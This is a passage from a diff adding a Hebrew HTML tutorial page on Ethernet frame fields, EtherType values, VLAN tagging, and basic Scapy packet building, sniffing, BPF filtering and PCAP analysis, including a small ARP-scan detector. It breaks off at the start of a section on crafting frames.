+          <div class="ic-title" style="color:var(--yellow); font-size: 16px;">EtherType / Length — 2 בתים</div>
+          <div class="ic-body mt8">
+            שדה זה מציין <strong>מה מכיל ה-Payload</strong>:<br><br>
+            אם הערך ≥ <code>0x0600</code> (1536) — זהו <strong>EtherType</strong> המציין פרוטוקול שכבה גבוהה יותר.<br><br>
+            אם הערך &lt; <code>0x0600</code> — זה Ethernet II ישן המציין את אורך ה-Payload (Ethernet 802.3 ישן).
+          </div>
+        </div>
+        <div>
+          <div class="fd-example">
+            <div class="ex-label">// ערכי EtherType נפוצים</div>
+            <pre style="padding:0; margin-top:6px; font-size: 16px; background:none;"><span class="hx">0x0800</span>  <span class="cm">→</span>  <span class="out">IPv4</span>
+<span class="hx">0x0806</span>  <span class="cm">→</span>  <span class="out">ARP</span>
+<span class="hx">0x86DD</span>  <span class="cm">→</span>  <span class="out">IPv6</span>
+<span class="hx">0x8100</span>  <span class="cm">→</span>  <span class="out">802.1Q VLAN tag</span>
+<span class="hx">0x0842</span>  <span class="cm">→</span>  <span class="out">Wake-on-LAN</span></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DATA -->
+  <div class="reveal mb24">
+    <div class="info-card bc-green">
+      <div class="two-col" style="gap:24px;">
+        <div>
+          <div class="ic-icon">📦</div>
+          <div class="ic-title" style="color:var(--green); font-size: 16px;">Data / Payload — 46 עד 1500 בתים</div>
+          <div class="ic-body mt8">
+            ה-Payload הוא המידע האמיתי — <strong>חבילת IP</strong> שבתוכה יש TCP/UDP, ובתוכה ה-HTTP/DNS/וכדומה.<br><br>
+            <strong>גודל מינימלי:</strong> 46 bytes. אם הנתון קטן יותר, מוסיפים <strong>Padding</strong> (אפסים) עד 46 bytes.<br><br>
+            <strong>MTU = 1500 bytes</strong>. חבילות גדולות יותר עוברות <strong>Fragmentation</strong> בשכבת הרשת.
+          </div>
+        </div>
+        <div>
+          <div class="ic-body">
+            <strong>שכבות בתוך ה-Payload:</strong>
+          </div>
+          <div class="gap-pills mt8">
+            <span class="layer-pill lp-eth">Ethernet Frame</span>
+            <span class="slash-sep">/</span>
+            <span class="layer-pill lp-ip">IP Packet</span>
+            <span class="slash-sep">/</span>
+            <span class="layer-pill lp-tcp">TCP Segment</span>
+            <span class="slash-sep">/</span>
+            <span class="layer-pill lp-raw">HTTP Data</span>
+          </div>
+          <div class="callout ca-cyan mt8" style="font-size: 16px;">
+            <div class="callout-icon">💡</div>
+            <div class="callout-body">בשפת Scapy — כל רמה היא <strong>שכבה שמוסיפה שכבה</strong>: <code>Ether()/IP()/TCP()/data</code></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CRC -->
+  <div class="reveal">
+    <div class="info-card bc-purple">
+      <div class="two-col" style="gap:24px;">
+        <div>
+          <div class="ic-icon">🔢</div>
+          <div class="ic-title" style="color:var(--purple); font-size: 16px;">CRC / FCS — 4 בתים</div>
+          <div class="ic-body mt8">
+            ה-CRC32 (Cyclic Redundancy Check) הוא <strong>Checksum</strong> לגילוי שגיאות.<br><br>
+            השולח מחשב CRC על כל שדות המסגרת ושם את התוצאה בשדה זה. הנמען מחשב מחדש — אם התוצאה שונה, <strong>המסגרת נזרקת</strong>.<br><br>
+            שכבת הקו <strong>מגלה</strong> שגיאות אך <strong>לא מתקנת</strong> — התיקון הוא תפקיד TCP.
+          </div>
+        </div>
+        <div>
+          <div class="fd-example">
+            <div class="ex-label">// חישוב CRC פשטני</div>
+            <pre style="padding:0; margin-top:6px; font-size: 16px; background:none;"><span class="cm"># מה שהשולח מחשב:</span>
+<span class="fn">CRC32</span>(Dst+Src+Type+Data)
+<span class="cm">→</span> <span class="hx">0xA3B2C1D0</span>
+
+<span class="cm"># הנמען מאמת:</span>
+<span class="kw">if</span> <span class="fn">CRC32</span>(frame) <span class="op">!=</span> fcs_field:
+    <span class="cm">→</span> <span class="err">DROP frame!</span></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ─── SEC 3: ETHERTYPE ─── -->
+<section class="section" id="sec-etype">
+  <div class="sec-header">
+    <div class="sec-tag sec-tag-yellow">// EtherType</div>
+    <h2 class="sec-h2">טבלת EtherType</h2>
+    <p class="sec-lead">שדה ה-EtherType (2 בתים) מציין לאיזה פרוטוקול שייך ה-Payload. זהו "מנגנון הרחבה" שאיפשר ל-Ethernet לשרת כל פרוטוקול.</p>
+  </div>
+
+  <div class="reveal">
+    <div class="frame-wrap">
+      <table class="etype-table">
+        <thead>
+          <tr>
+            <th>EtherType (hex)</th>
+            <th>שם פרוטוקול</th>
+            <th>תיאור ושימוש</th>
+            <th>Scapy Class</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><span class="etype-val">0x0800</span></td>
+            <td><span class="etype-proto">IPv4</span></td>
+            <td style="color:var(--muted2);">תקשורת אינטרנט רגילה — HTTP, DNS, SSH הכל עובר כאן</td>
+            <td><code style="color:var(--orange);">IP()</code></td>
+          </tr>
+          <tr>
+            <td><span class="etype-val">0x0806</span></td>
+            <td><span class="etype-proto">ARP</span></td>
+            <td style="color:var(--muted2);">מיפוי IP→MAC ברשת מקומית. בסיס ל-ARP Poisoning</td>
+            <td><code style="color:var(--orange);">ARP()</code></td>
+          </tr>
+          <tr>
+            <td><span class="etype-val">0x86DD</span></td>
+            <td><span class="etype-proto">IPv6</span></td>
+            <td style="color:var(--muted2);">כתובות IPv6 באורך 128 ביט</td>
+            <td><code style="color:var(--orange);">IPv6()</code></td>
+          </tr>
+          <tr>
+            <td><span class="etype-val">0x8100</span></td>
+            <td><span class="etype-proto">802.1Q VLAN</span></td>
+            <td style="color:var(--muted2);">תיוג VLAN — מוסיף 4 בתים נוספים למסגרת (VLAN Tag)</td>
+            <td><code style="color:var(--orange);">Dot1Q()</code></td>
+          </tr>
+          <tr>
+            <td><span class="etype-val">0x8892</span></td>
+            <td><span class="etype-proto">PROFINET</span></td>
+            <td style="color:var(--muted2);">תקשורת תעשייתית — רלוונטי לסייבר OT/ICS</td>
+            <td><code style="color:var(--muted);">Raw()</code></td>
+          </tr>
+          <tr>
+            <td><span class="etype-val">0x88CC</span></td>
+            <td><span class="etype-proto">LLDP</span></td>
+            <td style="color:var(--muted2);">גילוי שכנים ברשת (Link Layer Discovery Protocol)</td>
+            <td><code style="color:var(--orange);">LLDPDU()</code></td>
+          </tr>
+          <tr>
+            <td><span class="etype-val">0x0842</span></td>
+            <td><span class="etype-proto">Wake-on-LAN</span></td>
+            <td style="color:var(--muted2);">הפעלת מחשב מרחוק דרך הרשת (Magic Packet)</td>
+            <td><code style="color:var(--muted);">Raw()</code></td>
+          </tr>
+          <tr>
+            <td><span class="etype-val">0x8035</span></td>
+            <td><span class="etype-proto">RARP</span></td>
+            <td style="color:var(--muted2);">Reverse ARP — מציאת IP לפי MAC (מיושן, הוחלף ע"י DHCP)</td>
+            <td><code style="color:var(--muted);">—</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="callout ca-orange reveal mt16">
+    <div class="callout-icon">🔍</div>
+    <div class="callout-body">
+      <strong>ניתוח תנועה:</strong> כאשר מנתחים PCAP ב-Wireshark או Scapy, שדה ה-EtherType הוא הדבר הראשון שבודקים — הוא אומר לנו <strong>מה ה-Payload ועיל איזה שכבה להמשיך לנתח</strong>.
+    </div>
+  </div>
+
+  <hr class="sec-divider">
+
+  <!-- VLAN TAG EXPLANATION -->
+  <div class="reveal">
+    <div class="sec-header" style="margin-bottom:24px;">
+      <div class="sec-tag sec-tag-purple">// VLAN 802.1Q</div>
+      <h3 style="font-size:1.4rem; font-weight:700; margin-top:8px;">מסגרת Tagged — VLAN 802.1Q</h3>
+    </div>
+    <div class="info-card bc-purple">
+      <div class="ic-body mb16">
+        כאשר מוסיפים תיוג VLAN, <strong>מוסיפים 4 בתים</strong> בין שדה Source MAC ל-EtherType:
+      </div>
+      <div class="frame-row" style="margin-bottom:16px;">
+        <div class="frame-field ff-dst w-mac"><div class="ff-header">Dst MAC</div><div class="ff-size">6 bytes</div></div>
+        <div class="frame-field ff-src w-mac"><div class="ff-header">Src MAC</div><div class="ff-size">6 bytes</div></div>
+        <div class="frame-field" style="width:110px; background:rgba(168,85,247,0.2); border:1px solid rgba(168,85,247,0.4);">
+          <div class="ff-header" style="color:var(--purple);">VLAN Tag<br>0x8100</div>
+          <div class="ff-size" style="color:var(--purple);">4 bytes</div>
+        </div>
+        <div class="frame-field ff-type w-type"><div class="ff-header">EtherType</div><div class="ff-size">2 bytes</div></div>
+        <div class="frame-field ff-data w-data"><div class="ff-header">Data</div><div class="ff-size">46–1500</div></div>
+        <div class="frame-field ff-crc w-crc"><div class="ff-header">CRC</div><div class="ff-size">4 bytes</div></div>
+      </div>
+      <div class="code-wrap">
+        <div class="code-header">
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+          <span class="code-lang">python — scapy vlan</span>
+          <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+        </div>
+        <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+
+<span class="cm"># יצירת מסגרת עם תיוג VLAN 10</span>
+<span class="var">pkt</span> <span class="op">=</span> <span class="fn">Ether</span>(dst<span class="op">=</span><span class="str">"ff:ff:ff:ff:ff:ff"</span>) <span class="op">/</span> \
+      <span class="fn">Dot1Q</span>(vlan<span class="op">=</span><span class="num">10</span>) <span class="op">/</span> \
+      <span class="fn">IP</span>(dst<span class="op">=</span><span class="ip">"192.168.10.1"</span>) <span class="op">/</span> \
+      <span class="fn">ICMP</span>()
+
+<span class="cm"># הצגת שכבות</span>
+<span class="var">pkt</span>.show()
+<span class="out">###[ Ethernet ]###
+  dst = ff:ff:ff:ff:ff:ff
+  type = 0x8100  ← VLAN Tag!
+###[ 802.1Q ]###
+  vlan = 10
+###[ IP ]###  ...</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ─── SEC 4: SCAPY INTRO ─── -->
+<section class="section" id="sec-scapy">
+  <div class="sec-header">
+    <div class="sec-tag sec-tag-green">// Scapy</div>
+    <div class="scapy-logo">Scapy</div>
+    <p class="sec-lead">Scapy היא ספריית Python רבת עצמה ליצירה, שליחה, קבלה וניתוח חבילות רשת. היא כלי ה-go-to של חוקרי סייבר וחוקרי רשתות.</p>
+  </div>
+
+  <!-- INSTALLATION -->
+  <div class="reveal mb24">
+    <div class="code-wrap">
+      <div class="code-header">
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        <span class="code-lang">bash — התקנה</span>
+        <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+      </div>
+      <pre><span class="cm"># התקנה עם pip</span>
+<span class="pmt">$ </span>pip install scapy
+
+<span class="cm"># Linux: נדרש sudo/root לשליחה וקבלת חבילות</span>
+<span class="pmt">$ </span>sudo python3
+
+<span class="cm"># פתיחת shell אינטראקטיבי של Scapy</span>
+<span class="pmt">$ </span>sudo scapy
+<span class="out">Welcome to Scapy (2.5.0)
+&gt;&gt;&gt; </span></pre>
+    </div>
+  </div>
+
+  <!-- BASIC CONCEPTS -->
+  <div class="cards-grid cg-3 reveal mb24">
+    <div class="info-card bc-cyan">
+      <div class="ic-icon">🔧</div>
+      <div class="ic-title" style="color:var(--cyan);">יצירת שכבות (Layers)</div>
+      <div class="ic-body">
+        כל פרוטוקול הוא <strong>מחלקה Python</strong>. שכבות נבנות בפעולת <code>/</code>:<br><br>
+        <code>Ether()/IP()/TCP()</code>
+      </div>
+    </div>
+    <div class="info-card bc-green">
+      <div class="ic-icon">📡</div>
+      <div class="ic-title" style="color:var(--green);">שליחה וקבלה</div>
+      <div class="ic-body">
+        <code>sendp()</code> — שליחה בשכבה 2<br>
+        <code>send()</code> — שליחה בשכבה 3<br>
+        <code>srp()</code> — שלח וקבל (L2)<br>
+        <code>sr()</code> — שלח וקבל (L3)
+      </div>
+    </div>
+    <div class="info-card bc-orange">
+      <div class="ic-icon">🔍</div>
+      <div class="ic-title" style="color:var(--orange);">ניתוח</div>
+      <div class="ic-body">
+        <code>sniff()</code> — האזנה לתנועה<br>
+        <code>rdpcap()</code> — קריאת קובץ PCAP<br>
+        <code>pkt.show()</code> — הצגת שכבות<br>
+        <code>pkt.summary()</code> — תקציר
+      </div>
+    </div>
+  </div>
+
+  <!-- LAYER DEMO -->
+  <div class="reveal">
+    <div class="code-wrap">
+      <div class="code-header">
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        <span class="code-lang">python — scapy — יסודות</span>
+        <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+
+<span class="cm"># ─── יצירת מסגרת Ethernet בסיסית ───</span>
+<span class="var">eth</span> <span class="op">=</span> <span class="fn">Ether</span>(
+    dst<span class="op">=</span><span class="mac">"ff:ff:ff:ff:ff:ff"</span>,   <span class="cm"># MAC יעד (Broadcast)</span>
+    src<span class="op">=</span><span class="mac">"d8:bb:c1:7a:3f:2e"</span>,   <span class="cm"># MAC מקור (כרטיס שלנו)</span>
+    type<span class="op">=</span><span class="hx">0x0800</span>               <span class="cm"># EtherType = IPv4</span>
+)
+
+<span class="cm"># ─── הוספת שכבות בנגינת / ───</span>
+<span class="var">pkt</span> <span class="op">=</span> <span class="fn">Ether</span>() <span class="op">/</span> <span class="fn">IP</span>() <span class="op">/</span> <span class="fn">TCP</span>() <span class="op">/</span> <span class="str">"Hello!"</span>
+
+<span class="cm"># ─── גישה לשדות ───</span>
+<span class="fn">print</span>(<span class="var">pkt</span>[<span class="fn">Ether</span>].dst)        <span class="cm"># ff:ff:ff:ff:ff:ff</span>
+<span class="fn">print</span>(<span class="var">pkt</span>[<span class="fn">IP</span>].src)           <span class="cm"># 127.0.0.1</span>
+<span class="fn">print</span>(<span class="var">pkt</span>[<span class="fn">TCP</span>].dport)        <span class="cm"># 20</span>
+
+<span class="cm"># ─── הצגת כל השכבות ───</span>
+<span class="var">pkt</span>.show()
+
+<span class="out">###[ Ethernet ]###
+  dst       = ff:ff:ff:ff:ff:ff
+  src       = d8:bb:c1:7a:3f:2e
+  type      = IPv4 (0x0800)
+###[ IP ]###
+     version   = 4
+     ihl       = 5
+     src       = 127.0.0.1
+     dst       = 127.0.0.1
+###[ TCP ]###
+        sport     = ftp_data (20)
+        dport     = http (80)
+###[ Raw ]###
+           load      = 'Hello!'</span>
+
+<span class="cm"># ─── בדיקה לפי שכבה ───</span>
+<span class="var">pkt</span>.haslayer(<span class="fn">IP</span>)             <span class="cm"># True</span>
+<span class="var">pkt</span>.haslayer(<span class="fn">UDP</span>)            <span class="cm"># False</span></pre>
+    </div>
+  </div>
+</section>
+
+<!-- ─── SEC 5: SNIFFING ─── -->
+<section class="section" id="sec-sniff">
+  <div class="sec-header">
+    <div class="sec-tag sec-tag-cyan">// Sniffing</div>
+    <h2 class="sec-h2">האזנה לתנועת <span style="color:var(--cyan)">Ethernet</span></h2>
+    <p class="sec-lead">Scapy מאפשרת להאזין לתנועת הרשת על ממשק ספציפי, לסנן לפי BPF filter, ולנתח כל מסגרת בזמן אמת.</p>
+  </div>
+
+  <!-- TABS -->
+  <div class="tabs-header">
+    <button class="tab-btn active" onclick="switchTab('sniff', 'basic')">האזנה בסיסית</button>
+    <button class="tab-btn" onclick="switchTab('sniff', 'filter')">סינון BPF</button>
+    <button class="tab-btn" onclick="switchTab('sniff', 'callback')">עיבוד בזמן אמת</button>
+    <button class="tab-btn" onclick="switchTab('sniff', 'pcap')">קריאת PCAP</button>
+  </div>
+
+  <div id="sniff-basic" class="tab-pane active">
+    <div class="two-col" style="gap:24px; align-items:start;">
+      <div>
+        <div class="code-wrap">
+          <div class="code-header">
+            <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+            <span class="code-lang">python — האזנה בסיסית</span>
+            <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+          </div>
+          <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+
+<span class="cm"># האזנה ל-10 מסגרות על ממשק eth0</span>
+<span class="var">pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(
+    iface<span class="op">=</span><span class="str">"eth0"</span>,   <span class="cm"># ממשק רשת</span>
+    count<span class="op">=</span><span class="num">10</span>       <span class="cm"># כמות מסגרות</span>
+)
+
+<span class="cm"># סיכום כל מסגרת</span>
+<span class="var">pkts</span>.summary()
+
+<span class="out">Ether / IP / TCP 192.168.1.5:52341 > 8.8.8.8:443 S
+Ether / IP / UDP 192.168.1.5:53 > 192.168.1.1:53
+Ether / ARP who has 192.168.1.1 says 192.168.1.5
+...</span>
+
+<span class="cm"># גישה לחבילה ספציפית</span>
+<span class="var">first</span> <span class="op">=</span> <span class="var">pkts</span>[<span class="num">0</span>]
+<span class="fn">print</span>(<span class="var">first</span>[<span class="fn">Ether</span>].src)   <span class="cm"># MAC מקור</span>
+<span class="fn">print</span>(<span class="var">first</span>[<span class="fn">Ether</span>].dst)   <span class="cm"># MAC יעד</span>
+<span class="fn">print</span>(<span class="var">first</span>[<span class="fn">Ether</span>].type)  <span class="cm"># EtherType</span>
+
+<span class="cm"># שמירה ל-PCAP</span>
+<span class="fn">wrpcap</span>(<span class="str">"capture.pcap"</span>, <span class="var">pkts</span>)</pre>
+        </div>
+      </div>
+      <div>
+        <div class="info-card bc-cyan">
+          <div class="ic-title" style="color:var(--cyan);">פרמטרים חשובים ל-sniff()</div>
+          <div style="margin-top:12px; display:flex; flex-direction:column; gap:10px;">
+            <div class="fd-example" style="margin:0;">
+              <div class="ex-label">// iface</div>
+              <span class="ex-val">iface="eth0"</span> — ממשק רשת לקשיבה
+            </div>
+            <div class="fd-example" style="margin:0;">
+              <div class="ex-label">// count</div>
+              <span class="ex-val">count=50</span> — עצור אחרי N מסגרות
+            </div>
+            <div class="fd-example" style="margin:0;">
+              <div class="ex-label">// timeout</div>
+              <span class="ex-val">timeout=10</span> — עצור אחרי N שניות
+            </div>
+            <div class="fd-example" style="margin:0;">
+              <div class="ex-label">// filter</div>
+              <span class="ex-val">filter="arp"</span> — BPF filter
+            </div>
+            <div class="fd-example" style="margin:0;">
+              <div class="ex-label">// prn</div>
+              <span class="ex-val">prn=my_func</span> — callback לכל מסגרת
+            </div>
+            <div class="fd-example" style="margin:0;">
+              <div class="ex-label">// store</div>
+              <span class="ex-val">store=False</span> — לא לשמור בזיכרון
+            </div>
+          </div>
+        </div>
+        <div class="callout ca-red mt16">
+          <div class="callout-icon">🔑</div>
+          <div class="callout-body"><strong>נדרש הרשאות root/admin</strong> — Sniffing ברמת Ethernet דורש גישה ל-raw socket. הרץ עם <code>sudo python3</code>.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="sniff-filter" class="tab-pane">
+    <div class="code-wrap">
+      <div class="code-header">
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        <span class="code-lang">python — BPF filters</span>
+        <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+
+<span class="cm"># ─── סינון BPF (Berkeley Packet Filter) ───</span>
+<span class="cm"># BPF פועל ברמת הגרעין — יעיל מאוד!</span>
+
+<span class="cm"># רק חבילות ARP</span>
+<span class="var">arp_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(filter<span class="op">=</span><span class="str">"arp"</span>, count<span class="op">=</span><span class="num">5</span>)
+
+<span class="cm"># רק TCP מפורט HTTP/HTTPS</span>
+<span class="var">web_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(
+    filter<span class="op">=</span><span class="str">"tcp port 80 or tcp port 443"</span>,
+    iface<span class="op">=</span><span class="str">"eth0"</span>,
+    count<span class="op">=</span><span class="num">20</span>
+)
+
+<span class="cm"># רק ממחשב ספציפי</span>
+<span class="var">host_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(
+    filter<span class="op">=</span><span class="str">"host 192.168.1.100"</span>,
+    count<span class="op">=</span><span class="num">50</span>
+)
+
+<span class="cm"># שילוב: UDP + רשת ספציפית</span>
+<span class="var">dns_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(
+    filter<span class="op">=</span><span class="str">"udp port 53 and net 192.168.0.0/16"</span>,
+    count<span class="op">=</span><span class="num">10</span>
+)
+
+<span class="cm"># ─── פילטר לפי MAC address ───</span>
+<span class="cm"># BPF לא תומך ב-MAC ישירות — סנן בPython:</span>
+<span class="kw">def</span> <span class="fn">mac_filter</span>(pkt):
+    <span class="kw">if</span> pkt.haslayer(<span class="fn">Ether</span>):
+        <span class="kw">return</span> pkt[<span class="fn">Ether</span>].src <span class="op">==</span> <span class="mac">"d8:bb:c1:7a:3f:2e"</span>
+    <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="var">mac_pkts</span> <span class="op">=</span> <span class="fn">sniff</span>(lfilter<span class="op">=</span><span class="fn">mac_filter</span>, count<span class="op">=</span><span class="num">10</span>)
+
+<span class="cm"># ─── BPF filters שימושיים ───</span>
+<span class="cm"># "icmp"                    → Ping בלבד</span>
+<span class="cm"># "not arp"                 → הכל חוץ מ-ARP</span>
+<span class="cm"># "ether broadcast"         → Broadcast בלבד</span>
+<span class="cm"># "ether multicast"         → Multicast בלבד</span>
+<span class="cm"># "vlan 10"                 → VLAN 10 בלבד</span>
+<span class="cm"># "greater 500"             → מסגרות &gt; 500 bytes</span></pre>
+    </div>
+  </div>
+
+  <div id="sniff-callback" class="tab-pane">
+    <div class="code-wrap">
+      <div class="code-header">
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        <span class="code-lang">python — עיבוד בזמן אמת</span>
+        <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+<span class="kw">from</span> <span class="op">collections</span> <span class="kw">import</span> <span class="op">defaultdict</span>
+
+<span class="cm"># ─── דוגמה 1: מנהל תנועה בסיסי ───</span>
+<span class="kw">def</span> <span class="fn">analyze_eth</span>(pkt):
+    <span class="var">eth</span> <span class="op">=</span> pkt[<span class="fn">Ether</span>]
+    <span class="fn">print</span>(<span class="str">f"[Ethernet] {eth.src} → {eth.dst}"</span>,
+          <span class="str">f"| Type: {hex(eth.type)}"</span>,
+          <span class="str">f"| Len: {len(pkt)} bytes"</span>)
+    
+    <span class="kw">if</span> pkt.haslayer(<span class="fn">IP</span>):
+        <span class="var">ip</span> <span class="op">=</span> pkt[<span class="fn">IP</span>]
+        <span class="fn">print</span>(<span class="str">f"  [IP] {ip.src} → {ip.dst}"</span>)
+    
+    <span class="kw">elif</span> pkt.haslayer(<span class="fn">ARP</span>):
+        <span class="var">arp</span> <span class="op">=</span> pkt[<span class="fn">ARP</span>]
+        <span class="fn">print</span>(<span class="str">f"  [ARP] who has {arp.pdst}?"</span>
+              <span class="kw">if</span> <span class="var">arp</span>.op <span class="op">==</span> <span class="num">1</span> <span class="kw">else</span>
+              <span class="str">f"  [ARP] {arp.psrc} is at {arp.hwsrc}"</span>)
+
+<span class="fn">sniff</span>(iface<span class="op">=</span><span class="str">"eth0"</span>, prn<span class="op">=</span><span class="fn">analyze_eth</span>, count<span class="op">=</span><span class="num">20</span>)
+
+<span class="cm"># ─── דוגמה 2: זיהוי ARP Scanning ───</span>
+<span class="var">arp_counter</span> <span class="op">=</span> <span class="fn">defaultdict</span>(<span class="fn">int</span>)
+
+<span class="kw">def</span> <span class="fn">detect_arp_scan</span>(pkt):
+    <span class="kw">if</span> pkt.haslayer(<span class="fn">ARP</span>) <span class="kw">and</span> pkt[<span class="fn">ARP</span>].op <span class="op">==</span> <span class="num">1</span>:
+        <span class="var">src</span> <span class="op">=</span> pkt[<span class="fn">ARP</span>].psrc
+        <span class="var">arp_counter</span>[<span class="var">src</span>] <span class="op">+=</span> <span class="num">1</span>
+        <span class="kw">if</span> <span class="var">arp_counter</span>[<span class="var">src</span>] <span class="op">&gt;</span> <span class="num">20</span>:
+            <span class="fn">print</span>(<span class="str">f"⚠ ARP Scan detected from {src}!"</span>
+                  <span class="str">f" ({arp_counter[src]} requests)"</span>)
+
+<span class="fn">sniff</span>(filter<span class="op">=</span><span class="str">"arp"</span>, prn<span class="op">=</span><span class="fn">detect_arp_scan</span>,
+      store<span class="op">=</span><span class="kw">False</span>, iface<span class="op">=</span><span class="str">"eth0"</span>)
+
+<span class="out">⚠ ARP Scan detected from 192.168.1.200! (21 requests)
+⚠ ARP Scan detected from 192.168.1.200! (22 requests)</span></pre>
+    </div>
+  </div>
+
+  <div id="sniff-pcap" class="tab-pane">
+    <div class="code-wrap">
+      <div class="code-header">
+        <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        <span class="code-lang">python — קריאת / כתיבת PCAP</span>
+        <button class="copy-btn" onclick="copyCode(this)">העתק</button>
+      </div>
+      <pre><span class="kw">from</span> <span class="op">scapy.all</span> <span class="kw">import</span> <span class="op">*</span>
+
+<span class="cm"># ─── קריאת קובץ PCAP (כמו מ-Wireshark) ───</span>
+<span class="var">pkts</span> <span class="op">=</span> <span class="fn">rdpcap</span>(<span class="str">"capture.pcap"</span>)
+<span class="fn">print</span>(<span class="str">f"סה"כ מסגרות: {len(pkts)}"</span>)
+
+<span class="cm"># ─── ניתוח כל מסגרת Ethernet ───</span>
+<span class="kw">for</span> <span class="var">i</span>, <span class="var">pkt</span> <span class="kw">in</span> <span class="fn">enumerate</span>(<span class="var">pkts</span>):
+    <span class="kw">if</span> <span class="var">pkt</span>.haslayer(<span class="fn">Ether</span>):
+        <span class="var">eth</span> <span class="op">=</span> <span class="var">pkt</span>[<span class="fn">Ether</span>]
+        <span class="fn">print</span>(<span class="str">f"[{i}] {eth.src} → {eth.dst}"</span>
+              <span class="str">f" Type={hex(eth.type)} Len={len(pkt)}"</span>)
+
+<span class="cm"># ─── סינון אחרי הקריאה ───</span>
+<span class="var">arp_only</span>  <span class="op">=</span> [p <span class="kw">for</span> p <span class="kw">in</span> <span class="var">pkts</span> <span class="kw">if</span> p.haslayer(<span class="fn">ARP</span>)]
+<span class="var">large_pkts</span> <span class="op">=</span> [p <span class="kw">for</span> p <span class="kw">in</span> <span class="var">pkts</span> <span class="kw">if</span> <span class="fn">len</span>(p) <span class="op">&gt;</span> <span class="num">1000</span>]
+
+<span class="cm"># ─── סטטיסטיקות שולחים ───</span>
+<span class="kw">from</span> <span class="op">collections</span> <span class="kw">import</span> <span class="op">Counter</span>
+<span class="var">senders</span> <span class="op">=</span> <span class="fn">Counter</span>(
+    p[<span class="fn">Ether</span>].src <span class="kw">for</span> p <span class="kw">in</span> <span class="var">pkts</span> <span class="kw">if</span> p.haslayer(<span class="fn">Ether</span>)
+)
+<span class="fn">print</span>(<span class="str">"Top senders:"</span>, <span class="var">senders</span>.most_common(<span class="num">5</span>))
+<span class="out">Top senders: [('d8:bb:c1:7a:3f:2e', 342),
+               ('00:11:32:ab:cd:ef', 128), ...]</span>
+
+<span class="cm"># ─── כתיבה ל-PCAP ───</span>
+<span class="fn">wrpcap</span>(<span class="str">"filtered_arp.pcap"</span>, <span class="var">arp_only</span>)</pre>
+    </div>
+  </div>
+
+  <!-- SIMULATED SNIFF OUTPUT -->
+  <hr class="sec-divider">
+  <div class="reveal">
+    <div class="sec-tag sec-tag-cyan" style="margin-bottom:12px;">// פלט לדוגמה — כפי שנראה ב-Terminal</div>
+    <pre class="output-block">
+<span class="ob-prompt">>>> </span><span style="color:var(--text)">sniff(iface="eth0", count=8, prn=lambda p: p.summary())</span>
+<span class="ob-result">
+</span><span class="ob-result">Ether / ARP </span><span class="ob-sep">who has </span><span class="ob-val">192.168.1.1</span><span class="ob-sep"> says </span><span class="ob-val">192.168.1.50</span>
+<span class="ob-result">Ether / IP / TCP </span><span class="ob-val">192.168.1.50</span><span class="ob-sep">:52300 > </span><span class="ob-val">142.250.74.46</span><span class="ob-sep">:443 SA</span>
+<span class="ob-result">Ether / IP / UDP </span><span class="ob-val">192.168.1.50</span><span class="ob-sep">:54312 > </span><span class="ob-val">8.8.8.8</span><span class="ob-sep">:53</span>
+<span class="ob-result">Ether / ARP </span><span class="ob-val">192.168.1.1</span><span class="ob-sep"> is at </span><span class="ob-val">00:11:32:ab:cd:ef</span>
+<span class="ob-result">Ether / IP / ICMP </span><span class="ob-val">192.168.1.50</span><span class="ob-sep"> > </span><span class="ob-val">8.8.8.8</span><span class="ob-sep"> echo-request 0</span>
+<span class="ob-result">Ether / IP / ICMP </span><span class="ob-val">8.8.8.8</span><span class="ob-sep"> > </span><span class="ob-val">192.168.1.50</span><span class="ob-sep"> echo-reply 0</span>
+<span class="ob-result">Ether / IP / TCP </span><span class="ob-val">192.168.1.50</span><span class="ob-sep">:52300 > </span><span class="ob-val">142.250.74.46</span><span class="ob-sep">:443 PA</span>
+<span class="ob-result">Ether / IPv6 / ICMPv6 Neighbor Discovery</span>
+<span class="ob-result">&lt;Sniffed: TCP:3 UDP:1 ICMP:2 ARP:2 Other:0&gt;</span>
+    </pre>
+  </div>
+</section>
+
+<!-- ─── SEC 6: CRAFTING ─── -->
+<section class="section" id="sec-craft">
+  <div class="sec-header">
+    <div class="sec-tag sec-tag-orange">// Crafting</div>
+    <h2 class="sec-h2">יצירת מסגרות <span style="color:var(--orange)">Ethernet</span></h2>
